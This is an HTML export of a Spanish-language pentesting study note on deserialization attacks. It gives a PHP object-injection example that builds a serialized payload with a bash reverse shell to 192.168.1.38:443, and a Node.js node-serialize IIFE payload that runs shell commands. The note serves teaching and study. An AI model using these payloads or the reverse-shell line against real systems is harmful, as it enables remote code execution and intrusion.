<!DOCTYPE html> <html><head>
		<title>Deserialization Attack - (Ataques de Deserialización)</title>
		<base href="..\..\..\..\..\..\..\..\../">
		<meta id="root-path" root-path="..\..\..\..\..\..\..\..\../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="Hacking - Deserialization Attack - (Ataques de Deserialización)">
		<meta property="og:title" content="Deserialization Attack - (Ataques de Deserialización)">
		<meta property="og:description" content="Hacking - Deserialization Attack - (Ataques de Deserialización)">
		<meta property="og:type" content="website">
		<meta property="og:url" content="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/vulnerabilidades/linux/deserialization-attack-(ataques-de-deserialización).html">
		<meta property="og:image" content="undefined">
		<meta property="og:site_name" content="Hacking">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="Deserialization Attack - (Ataques de Deserialización)"><p>Deserialization Attack - (Ataques de Deserialización)</p></h1><div><hr></div><div><ul>
<li data-line="0">Tags: <a href="?query=tag:ataques" class="tag" target="_blank" rel="noopener">#ataques</a> <a href="?query=tag:teoria" class="tag" target="_blank" rel="noopener">#teoria</a> <a href="?query=tag:practica" class="tag" target="_blank" rel="noopener">#practica</a> <a href="?query=tag:basico" class="tag" target="_blank" rel="noopener">#basico</a> </li>
</ul></div><div><hr></div><div class="heading-wrapper"><h1 data-heading="¿ Que es la **serialización** ?" class="heading" id="¿_Que_es_la_**serialización**_?">¿ Que es la <strong>serialización</strong> ?</h1><div class="heading-children"><div><p>La <strong>serialización</strong> es el proceso de cvonvertir un objeto en una secuencia de <strong>bytes</strong> que puede ser almacenada o transmitida a través de una red. La <strong>deserialización</strong> es el proceso inverso, en el que una secuencia de bytes es convertida de nuevo a un objeto. </p></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="¿ Que es un **ataque de deserialización** ?" class="heading" id="¿_Que_es_un_**ataque_de_deserialización**_?">¿ Que es un <strong>ataque de deserialización</strong> ?</h1><div class="heading-children"><div><p>Los <strong>ataques de deserialización</strong> son un tipo de ataque que aprovecha las vulnerabilidades en los procesos de <strong>serialización</strong> y <strong>deserialización</strong> de objetos en aplicaciones que utilizan la programacón orientada a objetos (<strong>POO</strong>)</p></div><div><p>Estos ataques ocurren cuando un atacante puede manipular los datos que se están deserializando, lo que puede llevar a <a data-href="RCE - (Remote Command Execution)" href="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/vulnerabilidades/linux/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener">RCE - (Remote Command Execution)</a> en el servidor. </p></div><div><p>Los <strong>ataques de deserialización</strong> pueden ocurrir en diferentes tipos de aplicaciones, incluyendo aplicaciones web, aplicaciones móviles y aplicaciones de escritorio. Estos ataques pueden ser explotados de varias maneras como: </p></div><div><ul>
<li data-line="0">
<h3 data-heading="Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso." class="heading" id="Modificar_el_objeto_serializado_antes_de_que_sea_enviado_a_la_aplicación,_lo_que_puede_causar_errores_en_la_deserialización_y_permitir_que_un_atacante_ejecute_código_malicioso.">Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso.</h3>
</li>
<li data-line="1">
<h3 data-heading="Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso." class="heading" id="Enviar_un_objeto_serializado_malicioso_que_aproveche_una_vulnerabilidad_en_la_aplicación_para_ejecutar_código_malicioso.">Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso.</h3>
</li>
<li data-line="2">
<h3 data-heading="Realizar un ataque de **man-in-the-middle** para interceptar y modificar el objeto serializado antes de que llegue a la aplicación." class="heading" id="Realizar_un_ataque_de_**man-in-the-middle**_para_interceptar_y_modificar_el_objeto_serializado_antes_de_que_llegue_a_la_aplicación.">Realizar un ataque de <strong>man-in-the-middle</strong> para interceptar y modificar el objeto serializado antes de que llegue a la aplicación.</h3>
</li>
</ul></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="Evitar estos ataques" class="heading" id="Evitar_estos_ataques">Evitar estos ataques</h1><div class="heading-children"><div><p>Para evitar estos tipos de ataques, es importante que las aplicaciones validen y autentiquen adecuadamente todos los datos que reciben antes de deserializarlos. También es importante utilizar bibliotecas de serialización y deserializaciópn seguras y actualizar regularmente todas las bibliotecas y componentes de la aplicación para correfir posibles vulnerabilidades. </p></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="Explotación" class="heading" id="Explotación">Explotación</h1><div class="heading-children"><div><p>Estos ataques se pueden aconteser en muchos escenarios, por ejemplo, en aplicaciones web que tratan con NodeJS o PHP, por ejemplo, si detectaramos que la data interceptada con <a data-href="Burpsuite" href="notes/4.-cybersecurity/redteam/pentesting/sistemas/herramientas/burpsuite.html" class="internal-link" target="_self" rel="noopener">Burpsuite</a> viaja de una manera serializada, podriamos comenzar a pensar en un <strong>php deserilialisation attack</strong>. </p></div><div><p>La data interceptara por ejemplo se ve así:  <code>obj=O:8:"pingTest":1:{s:9:"ipAddress";s:9:"284781274";}&amp;ip=284781274</code></p></div><div><p>Y sabemos que por detras el código es el sig: </p></div><div><pre class="language-php" tabindex="0"><code class="language-php is-loaded"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">pingTest</span> <span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$ipAddress</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$isValid</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
	<span class="token keyword">function</span> <span class="token function-definition function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token this keyword">$this</span><span class="token operator">-&gt;</span><span class="token property">isValid</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token this keyword">$this</span><span class="token operator">-&gt;</span><span class="token property">ipAddress</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token this keyword">$this</span><span class="token operator">-&gt;</span><span class="token property">isValid</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
		<span class="token this keyword">$this</span><span class="token operator">-&gt;</span><span class="token function">ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token this keyword">$this</span><span class="token operator">-&gt;</span><span class="token property">isValid</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token this keyword">$this</span><span class="token operator">-&gt;</span><span class="token property">output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 3 <span class="token interpolation"><span class="token this keyword">$this</span><span class="token operator">-&gt;</span><span class="token property">ipAddress</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
		<span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'obj'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$pingTest</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'obj'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
	<span class="token variable">$pingTest</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pingTest</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$pingTest</span><span class="token operator">-&gt;</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code><button class="copy-code-button">Copy</button></pre></div><div><p>Donde, tras analizar el código, podriamos pensar en que si lograramos hacer que el valor de ipAddress sea un comando de bash a la par que isValid sea True, estariamos con la posibilidad de inyectar comandos en el sistema a traves de un <strong>Deserialization attack</strong>. </p></div><div><p>Podriamos crear un script de php imitando la funcionalidad del código que pudimos ver, para de esta manera recrear un <strong>nuevo</strong> objeto <strong>serializado</strong>.</p></div><div><pre class="language-php" tabindex="0"><code class="language-php is-loaded"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 

<span class="token keyword">class</span> <span class="token class-name-definition class-name">pingTest</span> <span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$ipadress</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"; bash -c 'bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1'"</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$isValid</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span> 
	<span class="token keyword">public</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">pingTest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code><button class="copy-code-button">Copy</button></pre></div><div><p>Logrando así, obtener un obj serializado válido el cual nos envía una reverse shell, teniendo así, posiblidad de <a data-href="RCE - (Remote Command Execution)" href="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/vulnerabilidades/linux/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener">RCE - (Remote Command Execution)</a>. </p></div><div class="heading-wrapper"><h5 data-heading="`O:8:&quot;pingTest&quot;:3:{s:9:&quot;ipAddress&quot;;s:53:&quot;; bash -c 'bash -i >&amp; /dev/tcp/192.168.1.38/443 0>&amp;1'&quot;;s:7:&quot;isValid&quot;;b:1;s:6:&quot;output&quot;;s:0:&quot;&quot;;}`" class="heading" id="`O:8:&quot;pingTest&quot;:3:{s:9:&quot;ipAddress&quot;;s:53:&quot;;_bash_-c_'bash_-i_>&amp;_/dev/tcp/192.168.1.38/443_0>&amp;1'&quot;;s:7:&quot;isValid&quot;;b:1;s:6:&quot;output&quot;;s:0:&quot;&quot;;}`"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><code>O:8:"pingTest":3:{s:9:"ipAddress";s:53:"; bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.38/443 0&gt;&amp;1'";s:7:"isValid";b:1;s:6:"output";s:0:"";}</code></h5><div class="heading-children"><div><hr></div></div></div></div></div><div class="heading-wrapper"><h1 data-heading="Nodejs Deserialization attack (unserialize)" class="heading" id="Nodejs_Deserialization_attack_(unserialize)">Nodejs Deserialization attack (unserialize)</h1><div class="heading-children"><div><p>Ahora, en un escenario de un <strong>node deserialization attack</strong> podriamos hacer uso del concepto <strong>IIFE (Inmediatly Invoked Function Exression)</strong>, el cual consiste en la declaración de funciones que son ejecutadas en el mismo momento de la declaración, de manera que, si capturaramos por ejemplo, una cookie la cual es <code>eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=</code>, al decodearle veriamos la sig data serializada: </p></div><div><p><code>{"username":"dobliuw","country":"india","city":"bangalore"}</code>, mientras que en la web vemos un "Hello dobliuw", podemos deducir que si cambiamos esta data serializada, para que en lugar de donde dice "dobliuw" diga otra cosa que ingresemos nosotros, podrimaos intentar hacer uso de un <strong>IIFE</strong> para que a la hora de que se deserialize dicha data, se ejecute una instrucción de <a data-href="RCE - (Remote Command Execution)" href="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/vulnerabilidades/linux/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener">RCE - (Remote Command Execution)</a>. </p></div><div><pre class="language-javascript" tabindex="0"><code class="language-javascript is-loaded"><span class="token keyword">const</span> serialize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token punctuation">{</span>
<span class="token function-variable function">username</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">exec</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> stdout <span class="token operator">?</span> <span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword null nil">null</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token literal-property property">country</span><span class="token operator">:</span> <span class="token string">"Argentina"</span><span class="token punctuation">,</span>
<span class="token literal-property property">city</span><span class="token operator">:</span> <span class="token string">"Buenos Aires"</span>
<span class="token punctuation">}</span>

<span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span>serialize<span class="token punctuation">.</span><span class="token method function property-access">serialize</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Esta función, que se encarga de serializar el payload, nos arrojaria lo sig: </p></div><div><p><code>{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', (err, stdout, stderr) =&gt; stdout ? console.log(stdout) : null)}","country":"Argentina","city":"Buenos Aires"}</code></p></div><div><p>De manera que nuestra función <code>_$$ND_FUNC$$_function(){require('child_process').exec('whoami', (err, stdout, stderr) =&gt; stdout ? console.log(stdout) : null)}</code> devera ser invocada indemediatamente agregado <code>()</code> alfinal de esta, </p></div><div><p><strong>IIFE</strong>: <code>_$$ND_FUNC$$_function(){require('child_process').exec('whoami', (err, stdout, stderr) =&gt; stdout ? console.log(stdout) : null)}()</code> </p></div><div><p>De esta manera, cuando el servidor deserialize la data, gracias a nuestra <strong>IIFE</strong>, se ejecutara el comando del lado del servidor, dejandonos así posiblidad de <a data-href="RCE - (Remote Command Execution)" href="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/vulnerabilidades/linux/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener">RCE - (Remote Command Execution)</a>. </p></div><div class="mod-footer"></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\deserialization-attack-(ataques-de-deserialización).html#Deserialization Attack - (Ataques de Deserialización)"><div class="tree-item-contents heading-link" heading-name="Deserialization Attack - (Ataques de Deserialización)"><span class="tree-item-title">Deserialization Attack - (Ataques de Deserialización)</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\deserialization-attack-(ataques-de-deserialización).html#¿_Que_es_la_**serialización**_?"><div class="tree-item-contents heading-link" heading-name="¿ Que es la **serialización** ?"><span class="tree-item-title">¿ Que es la <strong>serialización</strong> ?</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\deserialization-attack-(ataques-de-deserialización).html#¿_Que_es_un_**ataque_de_deserialización**_?"><div class="tree-item-contents heading-link" heading-name="¿ Que es un **ataque de deserialización** ?"><span class="tree-item-title">¿ Que es un <strong>ataque de deserialización</strong> ?</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\deserialization-attack-(ataques-de-deserialización).html#Modificar_el_objeto_serializado_antes_de_que_sea_enviado_a_la_aplicación,_lo_que_puede_causar_errores_en_la_deserialización_y_permitir_que_un_atacante_ejecute_código_malicioso."><div class="tree-item-contents heading-link" heading-name="Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso."><span class="tree-item-title">Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso.</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\deserialization-attack-(ataques-de-deserialización).html#Enviar_un_objeto_serializado_malicioso_que_aproveche_una_vulnerabilidad_en_la_aplicación_para_ejecutar_código_malicioso."><div class="tree-item-contents heading-link" heading-name="Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso."><span 